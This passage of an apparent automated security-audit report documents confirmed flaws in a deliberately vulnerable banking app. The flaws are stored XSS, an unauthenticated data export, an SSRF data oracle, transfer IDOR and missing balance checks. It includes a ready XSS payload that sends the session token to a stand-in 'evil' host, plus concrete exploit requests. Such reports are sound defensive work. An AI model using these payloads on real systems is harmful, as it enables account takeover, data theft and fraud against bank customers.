Confirmed cross-user stored XSS. Authenticated POST /api/transfers/external (and /own) accepts description with only string|max:255; Validator has no HTML/strip_tags rule. TransferService::transferExternal stores $description unchanged via Transaction::create. When the destination BSB/account is internal, to_account_id is set and the recipient is credited. GET /api/transactions?account_id=… is ownership-checked, then Transaction::findByUser selects rows where from_account_id OR to_account_id matches, so the sender’s description is returned to the victim. Transaction::format and Response::success (json_encode with no JSON_HEX_TAG) emit it raw. accounts.js renderDetailTransactions concatenates tx.description into an HTML string and assigns container.innerHTML, while the adjacent tx.type cell uses U.escapeHtml. No CSP meta/header exists (.htaccess, CorsMiddleware, index.html, Apache image). Session JWT is in localStorage (bankofed_token), so an img/svg event-handler payload executes in the banking origin and can steal the session. Frontend TOTP UI is not a control: the API proceeds if TOTP is unset or the code is omitted. PaymentController payee_name/reference concatenation is a second unsanitized source into the same column.

#### Code evidence

````
Source (user-controlled description persisted verbatim):
TransactionController::transferOwn/transferExternal accept 'description' => 'string|max:255' and pass it to TransferService, which stores it via Transaction::create with no HTML encoding. PaymentController also concatenates merchant_name / payee_name / reference into description.

Sink (account detail, incoming transfers included):
BankOfEd-main/public/banking/js/pages/accounts.js renderDetailTransactions:
  html += '...<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>...'
  container.innerHTML = html;

loadTransactions() calls GET /api/transactions?account_id=... and Transaction::findByUser selects rows where from_account_id OR to_account_id matches, so a transfer sent TO the victim is rendered.

Token storage: BankOfEd-main/public/banking/js/api.js localStorage.setItem('bankofed_token', token)
No Content-Security-Policy headers anywhere in the repo.

Frontend sink (unescaped description → innerHTML):
```
txns.forEach(function (tx) {
  ...
  html +=
    '<tr class="tx-row border-b border-slate-50">' +
      '<td ...>' + U.formatDate(tx.created_at) + '</td>' +
      '<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>' +
      '<td ...>' + U.escapeHtml(tx.type) + '</span></td>' +
      ...
});
html += '</tbody></table></div>';
container.innerHTML = html;
```

Source: POST /api/transfers/own and /api/transfers/external accept description with only `string|max:255` (no HTML sanitization). TransferService::transferOwn/transferExternal persist `$description` unchanged. Transaction::format returns it raw. Internal transfers set `to_account_id`, so the recipient’s GET /api/transactions?account_id=… includes the sender’s description.

PaymentController also builds `description` as `'Payment to ' . $payeeName . ' (' . $reference . ')'` from machine-auth input and stores it in the same column.
````

## 74. Stored XSS via unescaped transaction description on dashboard — Transfer and payment APIs persist attacker-supplied description/payee/reference

- Lead reference: ENCX-074
- Category: A03
- Severity: MEDIUM
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/dashboard.js:98
- Fingerprint: c677365ab7fe5e801c050554c0a30a7a5165f440fac78e11eac938c4d22878e4

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 54,
  "symbol": "transferOwn",
  "input": "description"
}
```

#### Controls encountered

```
[
  "U.escapeHtml exists and is used for account_name/bsb on the same page, but not for tx.description",
  "Validator string|max:255 — length only, no HTML sanitization",
  "transferOwn uses findByIdAndUser (ownership) — that path is self-XSS only; transferExternal does not",
  "Apache X-XSS-Protection: 1; mode=block — does not block DOM innerHTML XSS; no CSP"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/dashboard.js",
  "line": 98,
  "symbol": "container.innerHTML",
  "operation": "HTML output"
}
```

#### Counterevidence

```
[
  "Dashboard GET /api/transactions (no account_id) joins only from_account_id, so a transfer TO the victim does not appear on the dashboard. Incoming-credit XSS requires the account-detail renderer, not this sink.",
  "Suggested endpoint POST /api/transfers/own is ownership-checked and is self-XSS on this page; the working cross-user plant is POST /api/transfers/external (IDOR) or machine-auth payments."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Transfer/payment APIs persist attacker description/payee/reference with no HTML sanitization (string|max:255)",
    "Cross-user plant: POST /api/transfers/external with victim from_account_id (findById IDOR) so the row is outgoing for the victim",
    "Victim GET /api/transactions (no account_id) joins from_account_id",
    "dashboard.js concatenates tx.description into innerHTML without escapeHtml",
    "Payload executes in banking origin; steals bankofed_token"
  ],
  "impact": "Stored XSS on the dashboard via unsanitized persisted descriptions, cross-user when combined with the external-transfer source IDOR.",
  "severity_reasoning": "Distinct root cause is unsanitized persistence into transactions.description. Dashboard is outgoing-only so incoming credits do not hit this sink; IDOR plant does. Medium.",
  "dynamic_test": "POST /api/transfers/external from_account_id=<victim> description `<img src=x onerror=\\\"alert(localStorage.bankofed_token)\\\">`. As victim load the dashboard and confirm recent-transactions innerHTML executes. Contrast with a transfer TO the victim (should not appear on dashboard)."
}
```

#### Validator reasoning

Confirmed stored XSS: attacker-controlled transaction `description` is persisted without HTML sanitization and concatenated into the dashboard recent-transactions HTML, then assigned to `container.innerHTML`.

Source: `POST /api/transfers/own` and `POST /api/transfers/external` accept `description` as `string|max:255` only (`TransactionController` / `Validator`). `TransferService` writes `$description` unchanged via `Transaction::create`. `PaymentController::process`/`transfer` also compose descriptions from unsanitized `reference`/`payee_name`. `Response::success` uses `json_encode` without `JSON_HEX_TAG`. No `htmlspecialchars`/`strip_tags` anywhere.

Sink: `dashboard.js` `renderTransactions` (line 91–98) does `html += '... ' + (tx.description || tx.type) + ...` then `container.innerHTML = html`. Nearby account cards correctly call `U.escapeHtml`, and `U.escapeHtml` exists in `utils.js`, but it is not applied here. A payload such as `<img src=x onerror=...>` executes in the banking origin. Session token is `localStorage.bankofed_token`. No CSP (deploy vhost sets only nosniff/frame-options/XSS-Protection/Referrer-Policy). CSS `truncate` does not stop HTML parsing.

Cross-user path (not self-XSS): `TransferService::transferExternal` loads the source with `Account::findById` (explicitly no ownership check). TOTP is skippable when omitted; external transfers have no balance check. The planted row has `from_account_id` = victim account. Dashboard calls `GET /api/transactions` without `account_id`; `Transaction::findByUser` joins `transactions.from_account_id` to the caller’s accounts, so the victim’s dashboard renders the payload.

Claimed path (1) — a normal transfer *to* the victim — does **not** hit this dashboard sink, because the user-wide listing is outgoing-only. That does not defeat the finding: path (2) IDOR plus the payment description composition still deliver attacker HTML into this renderer. The same unescaped `tx.description` pattern also exists on the account-detail page (`accounts.js:164`), which *would* show incoming credits, but that is a sibling sink.

End-to-end: authenticated attacker `POST /api/transfers/external` with victim `from_account_id` and description `<img src=x onerror="fetch('https://evil/?t='+localStorage.bankofed_token)">` → victim opens `/banking/` dashboard → XSS in origin, token theft.

#### Code evidence

````
dashboard.js renderTransactions:
```
html +=
  '<div class="tx-row flex items-center gap-4 px-6 py-4">' +
    icon +
    '<div class="flex-1 min-w-0">' +
      '<p class="font-medium text-slate-900 truncate">' + (tx.description || tx.type) + '</p>' +
      ...
container.innerHTML = html;
```
Contrast with nearby account cards, which correctly call `U.escapeHtml(acc.account_name)`.

TransferService persists `$description` unchanged. TransactionController validates it only as `string|max:255`. PaymentController::transfer builds `description` from unsanitized `payee_name`/`reference`.
````

## 75. Unauthenticated export dumps all users, accounts, cards, and transactions — exportAll() uses SELECT * and returns password hashes, TOTP secrets, full PAN/CV

- Lead reference: ENCX-075
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:174
- Fingerprint: 5fe3c5b2ed4e553f130b6cd1008620f36a6391de7688e8749ee49c572f1fe64c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "line": 48,
  "symbol": "addRoute",
  "input": "unauthenticated GET /api/admin/export/users"
}
```

#### Controls encountered

```
[
  "AdminAuthMiddleware is implemented and used by every other /api/admin/* route, but is skipped here because the export route is registered with auth => false",
  "Authenticated admin customer list/show handlers project a reduced column set and omit password_hash, totp_secret, and card PAN/CVV, but exportAll uses SELECT * with no equivalent redaction",
  "No IP allowlist, network ACL, or reverse-proxy auth wraps /api/admin in index.php, .htaccess, or the Docker Apache config"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 174,
  "symbol": "$db->query",
  "operation": "SELECT * FROM users/accounts/transactions returned to client"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Unauthenticated GET /api/admin/export/users (auth => false)",
    "exportAll() uses SELECT * on users, accounts, and transactions — distinct root cause is returning password hashes, TOTP secrets, full PAN/CVV, and every transaction rather than a redacted export",
    "Response::success dumps the raw rows to the caller"
  ],
  "impact": "Unauthenticated exfiltration of credentials, 2FA seeds, card PAN/CVV, balances, and full ledger.",
  "severity_reasoning": "High: even if the route were authenticated, SELECT * of secrets/PCI data would be excessive; combined with auth=>false it is a complete data-breach sink.",
  "dynamic_test": "GET /api/admin/export/users. Assert users[].password_hash, users[].totp_secret, accounts[].card_number, accounts[].card_cvv, and a non-empty transactions array are present in JSON. Field-level presence is the reproduction target, not merely HTTP 200."
}
```

#### Validator reasoning

GET /api/admin/export/users is a live, reachable handler with a concrete unauthenticated source-to-sink path and no effective access-control or field-redaction control.

Source: public/index.php forwards any /api/admin/* URI to AdminRouter::dispatch(). AdminRouter registers GET /api/admin/export/users with handler AdminUserController::exportAll and auth => false (line 48). The dispatcher only calls AdminAuthMiddleware::handle() when $route['auth'] is truthy, so this route never checks a Bearer token, admin JWT issuer, revocation, or admin_users row.

Sink: exportAll() (AdminUserController.php:169-185) runs unconstrained SELECT * on users, accounts, and transactions, fetchAll()s the rows, and Response::success() json_encodes them to the client and exits. AdminDatabase sets PDO::FETCH_ASSOC, so every column is returned by name.

Schema (install/schema.sql) confirms those tables contain the claimed secrets: users.password_hash and users.totp_secret; accounts.card_number, accounts.card_expiry, and accounts.card_cvv; plus full transaction rows. Sibling admin methods (index/show) deliberately project a reduced column set and omit hashes/secrets/PAN/CVV, so the SELECT * dump is not accidental framework serialization — it is a distinct, more severe disclosure than the authenticated customer views.

No compensating control exists: .htaccess only rewrites to index.php; CORS reflects Origin and allows credentials; Docker publishes Apache on port 80 with no reverse-proxy auth; exportAll() takes no $auth argument and performs no IP, token, or role check. An unauthenticated GET therefore dumps every user credential secret, every card PAN/expiry/CVV, and every transaction as JSON.

#### Code evidence

```
AdminRouter.php: $r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

AdminUserController::exportAll():
$stmt = $db->query('SELECT * FROM users');
$stmt = $db->query('SELECT * FROM accounts');
$stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
Response::success(['users' => $users, 'accounts' => $accounts, 'transactions' => $transactions]);
```

## 76. SSRF: avatar proxy fetches attacker-controlled URL and returns the body — Fetched response body is returned to the attacker as base64, turning SSRF into a

- Lead reference: ENCX-076
- Category: A10
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:79
- Fingerprint: d5e9740edf5008660198812e87cfe00e1054f039ded7b5b512155dc96fdf2667

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 65,
  "symbol": "$data['url']",
  "input": "JSON body url"
}
```

#### Controls encountered

```
[
  "AuthMiddleware customer JWT on POST /api/profile/avatar (any registered user; public registration and seeded creds)",
  "5-second HTTP timeout (does not block local/internal fetches)",
  "empty($data['url']) check only"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 79,
  "symbol": "file_get_contents",
  "operation": "server-side fetch of attacker URL"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/profile/avatar with attacker-controlled url → file_get_contents (SSRF)",
    "Fetched response body is base64-encoded into avatar_data and returned to the attacker — distinct root cause: SSRF is turned into a full data oracle rather than a blind fetch",
    "Same URL stored as avatar_url"
  ],
  "impact": "Read-any-URL oracle: internal health/export endpoints, metadata services, and local files returned in the JSON body.",
  "severity_reasoning": "High: reflected SSRF body is the difference between a ping and full secret/DB theft (chain to /api/health and /api/admin/export/users).",
  "dynamic_test": "POST /api/profile/avatar {\\\"url\\\":\\\"http://127.0.0.1/api/admin/export/users\\\"} with any customer JWT. Base64-decode data.avatar_data and confirm it contains users/accounts JSON. A fetch that succeeds but returns empty/placeholder bytes would not demonstrate the oracle."
}
```

#### Validator reasoning

POST /api/profile/avatar is live (Router.php registers ProfileController::avatarProxy with customer JWT auth). avatarProxy reads JSON `url` from php://input, checks only emptiness, then passes it straight to file_get_contents() with follow_location enabled and no scheme/host/private-network allowlist. The entire fetched byte string is base64-encoded and returned in the JSON field `avatar_data` (plus `size` and `source_url`). MIME is copied from the remote Content-Type or defaults to image/png; non-image bodies are not rejected.

Auth is not an effective control: registration is public, seeded customer creds exist, and any valid JWT can invoke the proxy. The Docker image is php:8.2-apache with no php.ini/open_basedir/disable_functions/allow_url_fopen override, so remote HTTP(S) and local wrappers (file://, php://) work. Same-origin unauthenticated sinks (GET /api/health leaking jwt_secret and DB settings; GET /api/admin/export/users dumping users/accounts/transactions) are therefore readable through this oracle. No size cap, content-type allowlist, or response-body redaction exists. This is a concrete authenticated source-to-sink SSRF that returns the fetched body to the attacker.

#### Code evidence

```
public static function avatarProxy(array $auth): void {
    $data = json_decode(file_get_contents('php://input'), true) ?? [];
    // no URL validation
    $context = stream_context_create([
        'http' => ['timeout' => 5, 'follow_location' => true],
    ]);
    $content = @file_get_contents($data['url'], false, $context);
    User::update((int)$auth['user']['id'], ['avatar_url' => $data['url']]);
    $encoded = base64_encode($content);
    Response::success(['avatar_data' => "data:{$mime};base64,{$encoded}", 'source_url' => $data['url']]);
}
```

## 77. IDOR: external transfer debits any account by ID — No remaining-balance check on the external transfer path

- Lead reference: ENCX-077
- Category: A01
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:175
- Fingerprint: f76cda6a0e30aa78ead55e6f03d3df6e052aaac436295cb1fc4ee779ed063c6a

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 113,
  "symbol": "$data['from_account_id']",
  "input": "JSON from_account_id"
}
```

#### Controls encountered

```
[
  "AuthMiddleware (any valid customer JWT; no account-ownership binding)",
  "AddressBookEntry::findByIdAndUser (only when address_book_id is supplied; manual BSB/account path bypasses it)",
  "TOTP required for manual transfers, but bypassed when totp_enabled is false or totp_code is omitted",
  "transferOwn remaining-balance check exists only on the own-account path, not here",
  "No DB CHECK/trigger on accounts.balance",
  "Amount validator only enforces decimal format and > 0"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 175,
  "symbol": "Account::findById",
  "operation": "debit arbitrary account then updateBalance"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "POST /api/transfers/external with foreign from_account_id (IDOR via findById)",
    "No remaining-balance check on the external path (commented VULNERABILITY #9) — distinct root cause paired with the IDOR",
    "updateBalance applies an unbounded debit; destination attacker payee is credited"
  ],
  "impact": "Drain or overdraw any customer's account to an attacker-controlled BSB/account number, creating negative balances and paying third parties.",
  "severity_reasoning": "High: the missing balance invariant on the already-unscoped source account is what turns IDOR into unlimited theft/money creation.",
  "dynamic_test": "As user 2, POST /api/transfers/external from_account_id=1 (user 1 Everyday, seeded 3450.75) amount 999999 to attacker payee, no totp_code. Confirm 201, new_from_balance negative for account 1, and destination credit. Own-account transferOwn of the same amount should still hit INSUFFICIENT_FUNDS."
}
```

#### Validator reasoning

Confirmed. POST /api/transfers/external is registered with customer JWT auth only (Router.php). TransactionController::transferExternal takes attacker-controlled JSON from_account_id and amount (numeric/decimal>0 only; no max, no ownership, no remaining-balance comparison) and forwards them to TransferService::transferExternal.

That service loads the source with Account::findById($fromAccountId) rather than findByIdAndUser, so any existing account ID is accepted. Unlike transferOwn, which rejects transaction/fx debits when round(balance) < round(debitAmount), the external path has no remaining-balance (or credit-limit / is_active) check — the code comments that the check was removed. Account::updateBalance then runs UPDATE accounts SET balance = balance + ? with '-' . $debitAmount. The accounts.balance column is DECIMAL(15,2) with no CHECK/trigger, so the debit can exceed the current balance and drive the victim arbitrarily negative.

Destination is attacker-controlled on the manual path (to_bsb + 8-digit to_account_number). Address-book ownership does not apply there. TOTP is required for manual transfers in checkTotpRequired, but it is not a blocking control: if totp_enabled is false, or if totp_enabled is true and totp_code is omitted, the transfer still completes. Internal destinations are even credited via findByBsbAndNumber. Seeded accounts use sequential IDs (1, 2, 3, …), so the IDOR is trivially targeted.

End-to-end: any logged-in customer can debit any other customer’s account for an amount larger than its remaining balance and send the funds to an attacker-controlled BSB/account.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
$fromAccount = Account::findById($fromAccountId);
if (!$fromAccount) {
    Response::notFound('Source account not found.');
}
// VULNERABILITY #9: No balance check on external transfers
Account::updateBalance($fromAccountId, '-' . $debitAmount);
```

## 78. Payments transfer API does not authenticate the source account holder — Allowlist only applies to two token names and includes hardcoded user_id 16

- Lead reference: ENCX-078
- Category: A01
- Severity: HIGH
- Confidence: 88%
- Validation: dismissed
- Reportable: No
- Location: BankOfEd-main/src/Controllers/PaymentController.php:180
- Fingerprint: 9d329c031ea9902b28cddef60831acc6ca127a86337d5b3fbd8b23fa37110c32

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 163,
  "symbol": "$data['from_bsb']",
  "input": "JSON from_bsb and from_account_number"
}
```

#### Controls encountered

```
[
  "MachineAuthMiddleware requires a valid Bearer machine token before PaymentController::transfer runs",
  "Name check applies to both reachable token names: seeded face_insurance and fallback configured_machine_token",
  "When those names match, debit is limited to FACE merchant account_id (100) or user_id 16",
  "No application path creates additional machine_tokens rows"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 229,
  "symbol": "Account::updateBalance",
  "operation": "debit source account identified only by BSB/number"
}
```

#### Counterevidence

```
[
  "install/seed.sql inserts only one token, name=face_insurance, hash of mch_face_insurance_secret_key_2026",
  "MachineToken::validateToken fallback returns name configured_machine_token, which is included in the allowlist",
  "AdminRouter and installer have no machine-token CRUD; docker-entrypoint only loads schema+seed",
  "seed.sql user id 16 is FACE Insurance Pty Ltd (face@example.com); account 100 is FACE Insurance Settlements",
  "PaymentController comment explicitly authorizes FACE merchant or user #16 for those token names",
  "README describes this as a machine-token merchant payments API, not a customer-holder session"
]
```

#### Proof gaps

```
[
  "A DBA-inserted token with a third name would skip the allowlist, but that path is outside the application and is not demonstrated"
]
```

#### Attack path

Not available for this candidate

#### Validator reasoning

The cited allowlist is real code, but it is an effective control for every machine token the application can actually issue. POST /api/payments/transfer is machine-authenticated, looks up the source only by BSB+account number, then restricts debit only when `$auth['machine']['name']` is `face_insurance` or `configured_machine_token`. Those are exactly the two names `MachineToken::validateToken()` can return: the seeded DB row is named `face_insurance`, and the config fallback is hardcoded as `configured_machine_token`. There is no controller, admin route, installer path, or UI that inserts any other `machine_tokens` row. With those names the allowlist runs and rejects any source that is not merchant account 100 and not `user_id` 16. Seed data makes user 16 FACE Insurance Pty Ltd and account 100 the FACE settlements account (`062-001 88880001`); the inline comment documents that pairing as intentional merchant authorization, not a bypass of other customers. Draining FACE’s own settlement funds with FACE’s own machine token is the designed M2M behaviour of this payments API, not evidence that the allowlist fails to apply. The fail-open `else` (other token names skip the check) is therefore unreachable without an out-of-band DB insert, so there is no concrete unauthorized source-to-sink path for this split root cause.

#### Code evidence

```
$sourceAccount = Account::findByBsbAndNumber($fromBsb, $fromAccountNum);
$machineName = $auth['machine']['name'] ?? '';
if ($machineName === 'face_insurance' || $machineName === 'configured_machine_token') {
    $merchant = Merchant::findByMerchantId('faceinsurance');
    $allowedAccountId = $merchant ? (int)$merchant['account_id'] : 100;
    if ((int)$sourceAccount['id'] !== $allowedAccountId && (int)$sourceAccount['user_id'] !== 16) {
        Response::error('UNAUTHORIZED_ACCOUNT', '...', 403);
    }
}
Account::updateBalance((int)$sourceAccount['id'], '-' . $amount);
```

## 79. External transfers debit accounts with no available-balance check — transferOwn only enforces balance for account_type in [transaction, fx], allowin

- Lead reference: ENCX-079
- Category: A04
- Severity: HIGH
- Confidence: 91%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:95
- Fingerprint: 194fe2b6f451332f471cce3afb79bca95701c082d791a90f255094a9d19fb0ef

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 116,
  "symbol": "transferExternal",
  "input": "amount"
}
```

#### Controls encountered

```
[
  "Auth required on POST /api/transfers/own",
  "Amount must be a positive decimal (Validator decimal:2 and > 0)",
  "Source and destination must belong to the caller (Account::findByIdAndUser)",
  "transferOwn balance check only for account_type in [transaction, fx]",
  "PaymentController::process does check remaining credit-card balance (not on this path)",
  "accounts.balance is DECIMAL(15,2) with no CHECK constraint; credit_limit is stored but unused here"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 95,
  "symbol": "Account::updateBalance",
  "operation": "UPDATE accounts SET balance = balance + ? WHERE id = ?"
}
```

#### Counterevidence

```
[
  "Comment at TransferService.php:104 states loans can go more negative, so some additional loan drawdown appears intentional — but there is still no facility/limit cap, and the same skip also covers credit_card which is modeled as remaining available credit (opened at balance=credit_limit).",
  "Transfers within a credit card's remaining positive balance would be a cash-advance-style use of existing credit; the bug is amounts exceeding remaining credit / loan facility.",
  "Suggested endpoint on the lead (POST /api/transfers/external) is the sibling split, not this path."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/transfers/own with from_account_id of a credit_card or loan owned by the caller and amount exceeding remaining credit/facility",
    "TransactionController only checks amount > 0 / decimal:2; both accounts pass findByIdAndUser",
    "TransferService::transferOwn balance guard is only for account_type in [transaction, fx]; credit_card and loan skip it",
    "Account::updateBalance unconstrained increment credits the destination transaction account and drives the card/loan arbitrarily negative"
  ],
  "impact": "Self-enrichment: draw unlimited funds from a credit_card or loan onto a spendable transaction account, bypassing the posted credit limit that PaymentController::process does enforce.",
  "severity_reasoning": "Distinct root cause is transferOwn's type-conditional guard, independent of transferExternal's total omission. Seeded Platinum card and Home Loan demonstrate the path. High.",
  "dynamic_test": "As Amelia (or after opening a credit_card), POST /api/transfers/own {from_account_id: <credit_card>, to_account_id: <transaction>, amount: \"1000000.00\"}. Confirm the transaction account increases by 1,000,000 and the card balance is largely negative. Repeat from a loan account."
}
```

#### Validator reasoning

transferOwn is an authenticated, fully reachable fund-minting path. POST /api/transfers/own (Router.php, auth required) accepts a user-controlled positive decimal amount and two account IDs. TransactionController::transferOwn only checks amount > 0 and decimal format, then calls TransferService::transferOwn.

In TransferService::transferOwn the only balance guard is:
  if (in_array($fromAccount['account_type'], ['transaction', 'fx']) && remaining < debitAmount) → INSUFFICIENT_FUNDS
credit_card and loan sources skip that branch entirely. Both accounts are resolved with findByIdAndUser (own accounts only), TOTP is not required for transfer_type=own, and Account::updateBalance then runs unconstrained `UPDATE accounts SET balance = balance + ? WHERE id = ?` with no CHECK on accounts.balance and with credit_limit never consulted.

Concrete exploit using seeded data:
- Amelia (user 1) has Everyday transaction id=1 (3450.75) and Platinum Credit Card id=51 (balance=credit_limit=25000).
- POST /api/transfers/own {from_account_id:51, to_account_id:1, amount:"1000000.00"} credits the transaction account by 1,000,000 and drives the card to -975000, bypassing the 25k limit that PaymentController::process does enforce.
- Same user also has Home Loan id=3 at -285000; transferring 1,000,000 from it to the Everyday account creates unbounded additional debt and spendable funds. Users can also open new credit_card/loan accounts via POST /api/accounts and repeat.

The banking UI lists every account type in the own-transfer from/to dropdowns, so this is not API-only. Positive-amount validation and ownership checks do not prevent self-enrichment. Distinct from transferExternal’s missing check (all types): fixing one path does not fix the other. The in-code comment that “loans can go more negative” does not justify unbounded drawdowns or skipping credit_card remaining-credit entirely.

#### Code evidence

```
// VULNERABILITY #9: No balance check on external transfers — removed to allow unlimited overdraft

        // Determine transfer type and resolve payee details
        if ($addressBookId !== null) {
            $transferType = 'address_book';
            ...
        Database::beginTransaction();
        try {
            Account::updateBalance($fromAccountId, '-' . $debitAmount);

            // Credit if internal
            if ($toAccountId !== null) {
                Account::updateBalance($toAccountId, $creditAmount);
            }
```

## 80. External transfers debit accounts with no available-balance check — updateBalance has no floor/constraint, so application-level checks are the only

- Lead reference: ENCX-080
- Category: A04
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:95
- Fingerprint: 2e2d790f5d8fdfed1460e4f5739c88c0d26e0ea00df08e67c4bd4acb5f4c4f42

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 116,
  "symbol": "transferExternal",
  "input": "amount"
}
```

#### Controls encountered

```
[
  "POST /api/transfers/external requires user authentication",
  "amount must match decimal:2 and be > 0",
  "transferOwn checks balance only for transaction/fx sources (not this path)",
  "PaymentController machine-token transfer has a strict balance check (separate endpoint)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 95,
  "symbol": "Account::updateBalance",
  "operation": "UPDATE accounts SET balance = balance + ? WHERE id = ?"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated POST /api/transfers/external with amount larger than source balance",
    "transferExternal performs no balance comparison (removed)",
    "Account::updateBalance UPDATE ... balance = balance + ? with no AND balance >= ? predicate and no schema CHECK/UNSIGNED/trigger",
    "Internal destination credited, minting funds; source can reach DECIMAL(15,2) floor"
  ],
  "impact": "Unlimited overdraft because the shared updater has no floor; application-level checks are the only control and are missing on this path.",
  "severity_reasoning": "Distinct root cause is unconstrained updateBalance. Fixing transferExternal's missing compare without adding a DB/SQL floor still leaves other callers (credit_card/loan transferOwn) unsafe. High.",
  "dynamic_test": "POST /api/transfers/external amount 9999999.00 from a low-balance account to an internal destination. Inspect accounts.balance going negative. Optionally issue the same debit via a direct mental model: confirm schema has no CHECK and the SQL has no floor predicate."
}
```

#### Validator reasoning

Confirmed source-to-sink with no effective blocking control. POST /api/transfers/external is authenticated (Router auth => true) and accepts a user-controlled positive decimal `amount` (Validator decimal:2 plus `amount > 0`). TransactionController::transferExternal forwards that amount to TransferService::transferExternal. That method loads the source via Account::findById (no ownership, no is_active, no balance comparison). A comment at TransferService.php:212 states the balance check was removed. It then always executes Account::updateBalance($fromAccountId, '-' . $debitAmount). updateBalance issues an unconstrained `UPDATE accounts SET balance = balance + ? WHERE id = ?` with no `AND balance >= ?` predicate. Schema `accounts.balance` is signed DECIMAL(15,2) with no UNSIGNED, CHECK, or trigger, so the debit can drive the row arbitrarily negative (to -9999999999999.99). If the destination BSB/account number resolves to an internal account, the same transaction credits that account, minting spendable funds. transferOwn only guards `transaction`/`fx` sources and likewise relies on the unconstrained updater for credit_card/loan. Amount positivity and TOTP (which is also bypassable) do not prevent overdraft. Live execution was not required; the static path is complete and unambiguous.

#### Code evidence

```
// VULNERABILITY #9: No balance check on external transfers — removed to allow unlimited overdraft

        // Determine transfer type and resolve payee details
        if ($addressBookId !== null) {
            $transferType = 'address_book';
            ...
        Database::beginTransaction();
        try {
            Account::updateBalance($fromAccountId, '-' . $debitAmount);

            // Credit if internal
            if ($toAccountId !== null) {
                Account::updateBalance($toAccountId, $creditAmount);
            }
```

## 81. Self-service credit-card limit and loan amount have no upper bound — loan borrow_amount is validated only as decimal:2 > 0 with no maximum before upd

- Lead reference: ENCX-081
- Category: A04
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:75
- Fingerprint: f80be9ef8e220a7c3c8d229cc7c63b9f245bb119bc9817383299dbb0534edee4

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AccountController.php",
  "line": 48,
  "symbol": "store",
  "input": "credit_limit / borrow_amount"
}
```

#### Controls encountered

```
[
  "JWT required on POST /api/accounts (AuthMiddleware)",
  "account_type allowlist includes loan",
  "borrow_amount required|numeric|decimal:2 and must be > 0",
  "disbursement_account_id must belong to the caller and be account_type=transaction",
  "MySQL accounts.balance DECIMAL(15,2) storage ceiling (~10^13)",
  "PDO ERRMODE_EXCEPTION plus DB transaction rollback on overflow/errors"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 75,
  "symbol": "Account::create",
  "operation": "INSERT INTO accounts (... balance, ... credit_limit)"
}
```

#### Counterevidence

```
[
  "Loan origination also writes a matching negative balance on the new loan account (double-entry), but nothing enforces repayment or blocks spending of the disbursed credit.",
  "The loan Account::create insert uses initialBalance 0.00; money is created on the subsequent updateBalance of the destination, not on the INSERT itself."
]
```

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Public register; open a transaction account; JWT POST /api/accounts account_type=loan",
    "borrow_amount validated only as required|numeric|decimal:2 and > 0 (regex /^\\d+(\\.\\d{1,2})?$/, no max)",
    "Account::create inserts the loan at 0.00 then updateBalance debits the loan and credits the caller-owned disbursement transaction account",
    "No product maximum, KYC, approval, or rate limit; funds immediately spendable via transfers"
  ],
  "impact": "Instant unbounded loan disbursement into a spendable transaction account (up to DECIMAL(15,2)).",
  "severity_reasoning": "Distinct root cause is borrow_amount having no maximum before updateBalance credits the destination. credit_limit path is a sibling; this is the loan disbursement. High.",
